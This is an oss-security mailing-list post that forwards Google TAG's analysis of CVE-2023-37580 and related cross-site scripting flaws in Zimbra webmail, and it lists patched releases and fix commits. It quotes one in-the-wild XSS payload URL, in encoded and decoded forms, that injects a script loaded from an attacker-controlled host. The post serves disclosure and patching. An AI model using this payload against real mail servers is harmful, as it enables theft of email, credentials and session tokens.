Received: (qmail 1714 invoked by uid 550); 17 Nov 2023 13:39:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26423 invoked from network); 17 Nov 2023 12:12:19 -0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=notcom.org;
	s=jk; h=Content-Type:MIME-Version:Message-ID:Subject:To:From:Date:Sender:
	Reply-To:Cc:Content-Transfer-Encoding:Content-ID:Content-Description:
	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
	List-Post:List-Owner:List-Archive;
	bh=/e8rp49epyMkR//L5abfFlAX6jCu86odiVczx2R3JdY=; t=1700223139; x=1701087139; 
	b=ZjFHAsOFA3NzBleiXj5KSP+N9xLuI1OWNRJonX4KJb7W6jdckdDeGQWHqOO4TfeCp5OWSzv8y3e
	PWjYX3NKWTSICu+qIXcyaWxlDNUszOZf+eY4iiPqIEndzx019px4PXAQVKq8O0VSdhliS82EzthuV
	av8S0ZfWEX5JzUbDCi5jz/sXaGwboFg8rqddOdEv+/2hql36jH3t3yUujn0mDLFnWjaOrQM92lVem
	lyxUXdfRmviwkMFJhEdVCrp0/0qDY6oMEdP2ZGbfKm+NCz23Z2xoWGDiYe1azOPOdOgIoRxaYbsbK
	z2PUSg1Uijpsv3eKqPK+eEPZwG6b7Dqqn9Ww==;
Date: Fri, 17 Nov 2023 14:11:59 +0200
From: Valtteri Vuorikoski <vuori@notcom.org>
To: oss-security@lists.openwall.com
Message-ID: <4nksyq7teu5vpqkx5tzlmpi6pqimagq3jdby3u4g3e5lzqodij@noxitrjl7ffb>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: NeoMutt/20231006-6-ca2e93
Subject: [oss-security] CVE-2023-37580 (and others): XSS vulnerabilities in Zimbra
 Collaboration Suite

Not associated with Zimbra/TAG, just forwarding this.

The Zimbra Collaboration Suite is a groupware suite that includes a
webmail client. While the current main offering is a paid product, an
open-source version is available on Zimbra's Github.

There appear to be multiple recent vulnerabilities in the suite that
allow Javascript code to be injected into pages running in
authenticated contexts that affect the 8.8.x, 9.0.x and/or 10.0.x
release trains.

Google TAG has published an analysis of CVE-2023-37580 at
<https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/>:

  [T]here was a vulnerability in Zimbra that injected the parameter
  within the URL directly into the webpage, causing the script to
  be executed. An example that could trigger the XSS is:

    https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2F

  which decodes to:

    https://mail.REDACTED[.]com/m/momoveto?st=acg"/><script src="https://REDACTED/script.js"></script>//

  The fix was to escape the contents of the st parameter before it was
  set as the value in an html object.

According to TAG, the vulnerability is being actively exploited to
"steal email data, user credentials, and authentication tokens". It
appears that at least some of the same threat actors that were using
the recent Roundcube webmail exploit (CVE-2023-5631) to target
European government users have also been exploiting this vulnerability
against similar targets. However, unlike the Roundcube vulnerability,
CVE-2023-37580 is not "zero-click" in the sense that simply opening an
e-mail message is enough to trigger the exploit.

Independent of the TAG report, the Zimbra security advisory page
<https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories> lists at
least three other recent XSS vulnerabilities that based on the brief
description and recent Github commits may provide alternative
avenues for similar exploits: CVE-2023-43102, CVE-2023-41106 and
CVE-2023-43103.

As Zimbra no longer provides packaged versions of the suite's
open-source version, users must manually update their installations
from the upstream repository or rely on third-party-provided
packages/container images. Based on the advisory page, the tagged
releases 8.8.15p44, 9.0.0p37 and 10.0.5 should include patches for all
of the above.

The official "advisories" are quite uninformative, but the
following commits appear related to the above CVEs:

CVE-2023-37580: https://github.com/Zimbra/zm-web-client/commit/874ac8c158532a057b9857c21e1e03853b77ee6b
CVE-2023-43103: https://github.com/Zimbra/zm-web-client/commit/834eaf4b5eac8ed5cca9a994f9f031aa8d50d34a

File removal commit
<https://github.com/Zimbra/zm-web-client/commit/ef57b9ad60d4530a9659d9585c5d44eeb72b6cd9>
may be related to one (or more) of the other CVEs.

 -Valtteri
 
